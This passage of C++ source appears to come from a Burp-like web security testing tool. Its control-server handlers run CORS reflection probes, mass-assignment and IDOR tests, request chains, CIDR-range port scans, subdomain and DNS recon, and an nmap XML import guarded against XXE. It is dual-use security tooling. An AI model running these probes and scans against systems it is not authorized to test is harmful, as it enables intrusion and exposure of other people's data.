            cr.basePath += "?" + u.query(QUrl::FullyEncoded);
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            cr.headers.append({ it.key(), it.value().toString() });

        Nullock::Core::CorsTester::Result cres;
        {
            auto fut = QtConcurrent::run([cr]() {
                return Nullock::Core::CorsTester::test(cr);
            });
            fut.waitForFinished();
            cres = fut.result();
        }

        QJsonArray probes;
        for (const auto &p : cres.probes) {
            probes.append(QJsonObject{
                { "origin", p.origin }, { "label", p.label },
                { "acao", p.acao }, { "credentials", p.credentials },
                { "reflected", p.reflected }, { "severity", p.severity },
                { "kind", p.kind } });
            if (m_wiring.scanner && !p.severity.isEmpty()) {
                m_wiring.scanner->reportFinding(0, p.severity, p.kind,
                    QString("CORS: %1 origin '%2' reflected%3")
                        .arg(p.label, p.origin,
                             p.credentials ? " WITH credentials" : ""),
                    "ACAO=" + p.acao + " ACAC=" + (p.credentials ? "true" : "false"),
                    u.host(), url);
            }
        }
        return okJson({{ "ok", cres.error.isEmpty() },
                       { "error", cres.error },
                       { "requestsSent", cres.requestsSent },
                       { "findingCount", cres.findingCount },
                       { "probes", probes }});
    }

    // ---- Mass assignment / auto-binding ------------------------------
    // POST /api/massassign/test { url, method?, body?, contentType?,
    //                            headers?: {}, fields?: [...] }
    //   Injects privileged field names into the write request and reports
    //   the ones the server accepts (echoes our marker back). OWASP API #6;
    //   Burp has no native scanner for it.
    if (path == "/api/massassign/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::MassAssign::Request mr;
        mr.host = u.host();
        mr.port = u.port(u.scheme() == "https" ? 443 : 80);
        mr.tls  = (u.scheme() == "https");
        mr.method = bodyJson.value("method").toString("POST").toUpper();
        mr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            mr.basePath += "?" + u.query(QUrl::FullyEncoded);
        mr.body = bodyJson.value("body").toString().toUtf8();
        mr.contentType = bodyJson.value("contentType").toString();
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            mr.headers.append({ it.key(), it.value().toString() });

        QStringList fields;
        for (const QJsonValue &v : bodyJson.value("fields").toArray())
            fields << v.toString();
        if (fields.isEmpty())
            fields = Nullock::Core::MassAssign::defaultFields();
        if (fields.size() > 1000) fields = fields.mid(0, 1000);

        Nullock::Core::MassAssign::Result ma;
        {
            auto fut = QtConcurrent::run([mr, fields]() {
                return Nullock::Core::MassAssign::test(mr, fields);
            });
            fut.waitForFinished();
            ma = fut.result();
        }

        QJsonArray found;
        QStringList accepted;
        for (const auto &f : ma.found) {
            found.append(QJsonObject{{ "field", f.field }, { "marker", f.marker }});
            accepted << f.field;
        }
        if (m_wiring.scanner && !ma.found.isEmpty()) {
            m_wiring.scanner->reportFinding(0, "high", "mass-assignment",
                QString("Mass assignment: endpoint accepted privileged field(s) %1")
                    .arg(accepted.join(", ")),
                "injected fields were echoed back in the response object",
                u.host(), url);
        }
        return okJson({{ "ok", ma.error.isEmpty() },
                       { "error", ma.error },
                       { "bodyKind", ma.bodyKind },
                       { "requestsSent", ma.requestsSent },
                       { "fieldsTried", ma.fieldsTried },
                       { "reflectionUsable", ma.reflectionUsable },
                       { "foundCount", static_cast<int>(ma.found.size()) },
                       { "found", found }});
    }

    // ---- IDOR / BOLA auto-detection ----------------------------------
    // POST /api/idor/test { url, method?, idParam?, headers?: {} }
    //   Finds numeric object ids in the URL, replays with neighboring ids
    //   under the same session, and reports neighbors that return a
    //   distinct valid object (a horizontal IDOR lead). headers carries
    //   the session cookies / Authorization so the test runs authenticated.
    if (path == "/api/idor/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::IdorTester::Request ir;
        ir.host = u.host();
        ir.port = u.port(u.scheme() == "https" ? 443 : 80);
        ir.tls  = (u.scheme() == "https");
        ir.method = bodyJson.value("method").toString("GET").toUpper();
        ir.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            ir.basePath += "?" + u.query(QUrl::FullyEncoded);
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            ir.headers.append({ it.key(), it.value().toString() });
        const QString idParam = bodyJson.value("idParam").toString();

        Nullock::Core::IdorTester::Result tr;
        {
            auto fut = QtConcurrent::run([ir, idParam]() {
                return Nullock::Core::IdorTester::test(ir, idParam);
            });
            fut.waitForFinished();
            tr = fut.result();
        }

        QJsonArray findings;
        for (const auto &f : tr.findings) {
            QJsonArray accessible;
            QStringList ids;
            for (const auto &a : f.accessible) {
                accessible.append(QJsonObject{
                    { "id", a.mutatedId }, { "status", a.status }, { "length", a.length } });
                ids << a.mutatedId;
            }
            findings.append(QJsonObject{
                { "location", f.loc.descriptor },
                { "originalId", f.loc.originalValue },
                { "accessible", accessible } });
            // Each location with accessible neighbors is a real finding.
            if (m_wiring.scanner) {
                m_wiring.scanner->reportFinding(0, "high", "idor-horizontal",
                    QString("IDOR: %1 (id=%2) exposes neighboring objects %3")
                        .arg(f.loc.descriptor, f.loc.originalValue, ids.join(", ")),
                    "same-session replay of neighboring ids returned distinct valid objects",
                    u.host(), url);
            }
        }
        return okJson({{ "ok", tr.error.isEmpty() },
                       { "error", tr.error },
                       { "idLocationsFound", tr.idLocationsFound },
                       { "requestsSent", tr.requestsSent },
                       { "findingCount", static_cast<int>(tr.findings.size()) },
                       { "findings", findings }});
    }

    // ---- Repeater chains ---------------------------------------------
    // POST /api/chain/run
    //   { continueOnError?: false,
    //     steps: [ { name, host, port, tls, request,
    //                extract: [ { var, from: "header"|"cookie"|"json"|
    //                                    "regex"|"status", key } ] } ] }
    //
    // Runs the steps in order, threading {{var}} values extracted from
    // each response into the next request. Returns every step's status,
    // timing, and the values it extracted. Postman-style chaining that
    // Burp lacks natively.
    //
    // This handler blocks until the whole chain finishes so the caller
    // gets results in one round-trip. Two consequences: (1) a long chain
    // briefly stalls other control requests, and (2) a step must NOT
    // target this control server's own port -- that self-loops into a
    // deadlock (we're busy waiting for the chain we'd need to serve).
    // Chains target the app under test, so this is a non-issue in practice.
    if (path == "/api/chain/run") {
        const QJsonArray stepsArr = bodyJson.value("steps").toArray();
        if (stepsArr.isEmpty())
            return okJson({{ "ok", false }, { "error", "steps[] required" }});
        if (stepsArr.size() > 50)
            return okJson({{ "ok", false }, { "error", "max 50 steps" }});

        QList<Nullock::Core::ChainRunner::Step> steps;
        for (const QJsonValue &sv : stepsArr) {
            const QJsonObject so = sv.toObject();
            Nullock::Core::ChainRunner::Step st;
            st.name = so.value("name").toString();
            st.host = so.value("host").toString();
            st.port = so.value("port").toInt(so.value("tls").toBool(true) ? 443 : 80);
            st.tls  = so.value("tls").toBool(true);
            st.request = so.value("request").toString().toUtf8();
            if (st.host.isEmpty() || st.request.isEmpty())
                return okJson({{ "ok", false },
                               { "error", "each step needs host + request" }});
            for (const QJsonValue &ev : so.value("extract").toArray()) {
                const QJsonObject eo = ev.toObject();
                Nullock::Core::ChainRunner::Extract ex;
                ex.var = eo.value("var").toString();
                ex.key = eo.value("key").toString();
                const QString from = eo.value("from").toString("header").toLower();
                if      (from == "cookie") ex.from = Nullock::Core::ChainRunner::Extract::Cookie;
                else if (from == "json")   ex.from = Nullock::Core::ChainRunner::Extract::Json;
                else if (from == "regex")  ex.from = Nullock::Core::ChainRunner::Extract::Regex;
                else if (from == "status") ex.from = Nullock::Core::ChainRunner::Extract::Status;
                else                       ex.from = Nullock::Core::ChainRunner::Extract::Header;
                st.extracts.append(ex);
            }
            steps.append(st);
        }

        const bool continueOnError = bodyJson.value("continueOnError").toBool(false);
        // Chains are sequential network I/O; run off the GUI thread but
        // block this control request until done so the caller gets results.
        Nullock::Core::ChainRunner::Result r;
        {
            auto future = QtConcurrent::run([steps, continueOnError]() {
                return Nullock::Core::ChainRunner::run(steps, continueOnError);
            });
            future.waitForFinished();
            r = future.result();
        }

        QJsonArray stepsOut;
        for (const auto &sr : r.steps) {
            QJsonObject eo;
            for (auto it = sr.extracted.cbegin(); it != sr.extracted.cend(); ++it)
                eo.insert(it.key(), it.value());
            stepsOut.append(QJsonObject{
                { "name", sr.name },
                { "ok", sr.ok },
                { "status", sr.status },
                { "ms", static_cast<double>(sr.ms) },
                { "requestSize", sr.requestSize },
                { "responseSize", sr.responseSize },
                { "error", sr.error },
                { "extracted", eo },
                { "responsePreview", QString::fromUtf8(sr.responsePreview) },
            });
        }
        QJsonObject varsOut;
        for (auto it = r.vars.cbegin(); it != r.vars.cend(); ++it)
            varsOut.insert(it.key(), it.value());
        return okJson({{ "ran", static_cast<int>(r.steps.size()) },
                       { "steps", stepsOut },
                       { "vars", varsOut }});
    }

    // ---- port scanner ------------------------------------------------
    // POST /api/portscan/start { host | hosts | cidr, preset|ports,
    //                            timeoutMs?, parallel?, banner? }
    //   preset = "discovery" | "top100" | "web" | "full1024" | custom
    if (path == "/api/portscan/start") {
        if (!m_wiring.portScanner)
            return okJson({{ "ok", false }, { "error", "no port scanner" }});
        Nullock::Core::ScanRequest sr;
        sr.host = bodyJson.value("host").toString();
        sr.timeoutMs = bodyJson.value("timeoutMs").toInt(1500);
        sr.parallel  = bodyJson.value("parallel").toInt(64);
        sr.grabBanner = bodyJson.value("banner").toBool(true);
        sr.throttleMs = bodyJson.value("throttleMs").toInt(0);
        sr.randomize  = bodyJson.value("randomize").toBool(false);

        // Clamp to sane bounds. parallel was previously taken raw; a
        // malicious or buggy caller specifying parallel=100000 launched
        // a thread per probe with no upper cap on concurrent sockets.
        if (sr.parallel  < 1)    sr.parallel  = 1;
        if (sr.parallel  > 256)  sr.parallel  = 256;
        if (sr.timeoutMs < 50)   sr.timeoutMs = 50;
        if (sr.timeoutMs > 30000) sr.timeoutMs = 30000;
        if (sr.throttleMs < 0)   sr.throttleMs = 0;
        if (sr.throttleMs > 60000) sr.throttleMs = 60000;

        // Multi-host modes. hosts[] is just a JSON array. cidr is
        // expanded server-side -- accepts "192.168.1.0/24" through
        // "10.0.0.0/16" (caps at /16 = 65k hosts to keep us from
        // immolating ourselves). The single-host form sr.host is
        // already populated above.
        for (const QJsonValue &v : bodyJson.value("hosts").toArray()) {
            const QString h = v.toString().trimmed();
            if (!h.isEmpty()) sr.hosts.append(h);
        }
        const QString cidr = bodyJson.value("cidr").toString().trimmed();
        if (!cidr.isEmpty()) {
            const int slash = cidr.indexOf('/');
            if (slash > 0) {
                const QString netStr = cidr.left(slash);
                const int bits = cidr.mid(slash + 1).toInt();
                const QStringList octets = netStr.split('.');
                if (octets.size() == 4 && bits >= 16 && bits <= 32) {
                    quint32 net = 0;
                    bool ok = true;
                    for (int i = 0; i < 4 && ok; ++i) {
                        const int v = octets[i].toInt(&ok);
                        if (v < 0 || v > 255) { ok = false; break; }
                        net = (net << 8) | static_cast<quint32>(v);
                    }
                    if (ok) {
                        const quint32 mask = bits == 32 ? 0xFFFFFFFFu
                                              : (~0u) << (32 - bits);
                        const quint32 base = net & mask;
                        const quint32 size = bits == 32 ? 1
                                              : (1u << (32 - bits));
                        // Skip network + broadcast for /<31. /31 and /32
                        // hand back everything (point-to-point / single).
                        const quint32 startI = (bits < 31) ? 1u : 0u;
                        const quint32 endI   = (bits < 31) ? size - 1u : size;
                        for (quint32 i = startI; i < endI; ++i) {
                            const quint32 ip = base + i;
                            sr.hosts.append(QString("%1.%2.%3.%4")
                                .arg((ip >> 24) & 0xff)
                                .arg((ip >> 16) & 0xff)
                                .arg((ip >> 8)  & 0xff)
                                .arg(ip        & 0xff));
                        }
                    }
                }
            }
        }

        // Curated presets so the user can hit "top 100 ports" in one click.
        const QString preset = bodyJson.value("preset").toString();
        QList<quint16> ports;
        if (preset == "discovery") {
            // The "is anything alive at this IP" set -- four ports that
            // catch ~95% of internet-exposed boxes. Fast.
            ports = { 22, 80, 443, 3389 };
        } else if (preset == "top100") {
            // Nmap's --top-ports 100 list, sorted for grep-friendliness.
            ports = { 7, 21, 22, 23, 25, 26, 53, 80, 81, 110, 111,
                113, 119, 135, 139, 143, 144, 179, 199, 389, 427,
                443, 444, 445, 465, 513, 514, 515, 543, 544, 548,
                554, 587, 631, 646, 873, 990, 993, 995, 1025, 1026,
                1027, 1028, 1029, 1110, 1433, 1720, 1723, 1755,
                1900, 2000, 2001, 2049, 2121, 2717, 3000, 3128, 3306,
                3389, 3986, 4899, 5000, 5009, 5051, 5060, 5101, 5190,
                5357, 5432, 5631, 5666, 5800, 5900, 6000, 6001, 6646,
                7070, 8000, 8008, 8009, 8080, 8081, 8443, 8888, 9100,
                9999, 10000, 32768, 49152, 49153, 49154, 49155, 49156,
                49157, 1024, 1027, 1029, 1110, 1433, 8443 };
        } else if (preset == "web") {
            ports = { 80, 81, 88, 443, 591, 631, 1080, 2375, 3000,
                4443, 4567, 5000, 5601, 5985, 5986, 6443, 7474,
                8000, 8001, 8008, 8009, 8080, 8081, 8086, 8088,
                8161, 8181, 8443, 8500, 8530, 8531, 8800, 8834,
                8880, 8888, 9000, 9090, 9091, 9200, 9418, 9443,
                15672, 27017 };
        } else if (preset == "full1024") {
            for (quint16 p = 1; p <= 1024; ++p) ports.append(p);
        } else {
            for (const QJsonValue &v : bodyJson.value("ports").toArray()) {
                const int p = v.toInt(0);
                if (p > 0 && p < 65536) ports.append(static_cast<quint16>(p));
            }
        }
        sr.ports = ports;

        // Hard cap on total work. host * port can blow up fast: a /16
        // (~65k hosts) with full1024 = ~67M probes. Refuse anything past
        // 100k tasks; user can re-issue smaller chunks.
        constexpr int kMaxScanTasks = 100'000;
        const qint64 tasks = static_cast<qint64>(sr.hosts.size()) * sr.ports.size();
        if (tasks > kMaxScanTasks) {
            return okJson({
                { "ok", false },
                { "error", QString("scan too large: %1 probes (cap %2)")
                              .arg(tasks).arg(kMaxScanTasks) },
            });
        }
        const bool ok = m_wiring.portScanner->start(sr);
        return okJson({{ "ok", ok }, { "count", ports.size() }});
    }
    if (path == "/api/portscan/stop") {
        if (m_wiring.portScanner) m_wiring.portScanner->stop();
        return okJson();
    }
    if (path == "/api/portscan/clear") {
        if (m_wiring.portScanner) m_wiring.portScanner->clear();
        return okJson();
    }

    // ---- recon engine ------------------------------------------------
    if (path == "/api/recon/dns") {
        if (m_wiring.recon)
            m_wiring.recon->runDns(bodyJson.value("domain").toString());
        return okJson();
    }
    if (path == "/api/recon/crt") {
        if (m_wiring.recon)
            m_wiring.recon->runCertTransparency(bodyJson.value("domain").toString());
        return okJson();
    }
    if (path == "/api/recon/wordlist") {
        if (m_wiring.recon) {
            const QString domain = bodyJson.value("domain").toString();
            QStringList words;
            for (const QJsonValue &v : bodyJson.value("subdomains").toArray()) {
                const QString s = v.toString().trimmed();
                if (!s.isEmpty()) words.append(s);
            }
            m_wiring.recon->runSubdomainWordlist(domain, words);
        }
        return okJson();
    }
    if (path == "/api/recon/stop") {
        if (m_wiring.recon) m_wiring.recon->stop();
        return okJson();
    }
    if (path == "/api/recon/clear") {
        if (m_wiring.recon) m_wiring.recon->clear();
        return okJson();
    }

    // ---- sessions (cookie jar) ---------------------------------------
    if (path == "/api/sessions/autoInject") {
        bool ok = m_wiring.sessions
               && m_wiring.sessions->setAutoInject(bodyJson.value("host").toString(),
                                                    bodyJson.value("on").toBool());
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/sessions/clear") {
        if (!m_wiring.sessions) return okJson({{ "ok", false }});
        const QString host = bodyJson.value("host").toString();
        if (host.isEmpty()) m_wiring.sessions->clearAll();
        else                m_wiring.sessions->clearHost(host);
        return okJson();
    }
    if (path == "/api/sessions/copyTo") {
        bool ok = m_wiring.sessions
               && m_wiring.sessions->copyTo(bodyJson.value("from").toString(),
                                             bodyJson.value("to").toString());
        return okJson({{ "ok", ok }});
    }
    // POST /api/portscan/import-nmap  body: raw nmap XML
    // Pulls <host>/<ports>/<port>/<state>/<service> into PortResult.
    if (path == "/api/portscan/import-nmap") {
        if (!m_wiring.portScanner)
            return okJson({{ "ok", false }, { "error", "no port scanner" }});
        // XXE / billion-laughs defence. Qt's QXmlStreamReader doesn't
        // expand external entities by default, but it does report
        // <!ENTITY> declarations and entity references as tokens, and
        // historical Qt CVEs (CVE-2015-1858) covered exactly this kind
        // of recursive entity bomb. Rejecting any DTD/ENTITY in the body
        // up front means a future Qt change (or a parser swap) can't
        // re-open the hole. We also cap element nesting depth at 64 so
        // a hand-crafted-deep XML can't blow the recursion budget.
        const QByteArray needleD = QByteArrayLiteral("<!DOCTYPE");
        const QByteArray needleE = QByteArrayLiteral("<!ENTITY");
        const QByteArray bodyHead = body.left(64 * 1024);
        if (bodyHead.contains(needleD) || bodyHead.contains(needleE)) {
            return okJson({{ "ok", false }, { "error",
                "nmap XML import refuses input containing DTD or ENTITY declarations" }});
        }
        QXmlStreamReader xml(body);
        int depth = 0;
        QString currentHost;
        QString currentAddr;
        QList<Nullock::Core::PortResult> imported;
        while (!xml.atEnd()) {
            xml.readNext();
            if (xml.isStartElement()) {
                if (++depth > 64) {
                    return okJson({{ "ok", false }, { "error",
                        "nmap XML import: element nesting depth exceeded" }});
                }
                const QString name = xml.name().toString();
                if (name == "host") {
                    currentHost.clear();
                    currentAddr.clear();
                } else if (name == "address") {
                    currentAddr = xml.attributes().value("addr").toString();
                } else if (name == "hostname") {
                    currentHost = xml.attributes().value("name").toString();
                } else if (name == "port") {
                    Nullock::Core::PortResult r;
                    r.host = !currentHost.isEmpty() ? currentHost : currentAddr;
                    r.port = static_cast<quint16>(xml.attributes().value("portid").toInt());
                    while (!xml.atEnd()) {
                        xml.readNext();
                        if (xml.isStartElement() && xml.name() == QLatin1String("state")) {
                            r.status = xml.attributes().value("state").toString();
                        } else if (xml.isStartElement() && xml.name() == QLatin1String("service")) {
                            r.service = xml.attributes().value("name").toString();
                            r.banner  = xml.attributes().value("banner").toString();
                        } else if (xml.isEndElement() && xml.name() == QLatin1String("port")) {
                            break;
                        }
                    }
                    if (r.port > 0) imported.append(r);
                }
            } else if (xml.isEndElement()) {
                if (depth > 0) --depth;
            }
        }
        if (xml.hasError())
            return okJson({{ "ok", false }, { "error", xml.errorString() } });
        // Group display host: just the first one found, or "N hosts"
        // when imported from a multi-host nmap run.
        QSet<QString> distinctHosts;
        for (const auto &r : imported) distinctHosts.insert(r.host);
        const QString displayHost = distinctHosts.size() == 1
            ? *distinctHosts.cbegin()
            : QString("%1 hosts").arg(distinctHosts.size());
        const bool ok = m_wiring.portScanner->setResults(displayHost, imported);
        return okJson({
            { "ok",       ok },
            { "imported", imported.size() },
        });
    }

    // ---- project management ------------------------------------------
    if (path == "/api/project/list") {
        if (!m_wiring.projectStore) return httpJson(200, QJsonObject{});
        QJsonArray names;
        for (const QString &n : m_wiring.projectStore->listProjects())
            names.append(n);
        return httpJson(200, QJsonObject{
            { "root",     m_wiring.projectStore->projectsRoot() },
            { "current",  m_wiring.projectStore->metadata().name },
            { "projects", names },
        });
    }
    if (path == "/api/project/open") {
        bool ok = m_wiring.projectStore
               && m_wiring.projectStore->openByName(bodyJson.value("name").toString());
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/project/create") {
        bool ok = m_wiring.projectStore
               && m_wiring.projectStore->createProject(bodyJson.value("name").toString());
        return okJson({{ "ok", ok }});
    }

    (void)method;
    return httpResponse(404, "text/plain", "Not found: " + path.toUtf8());
}

} // namespace Nullock::Control
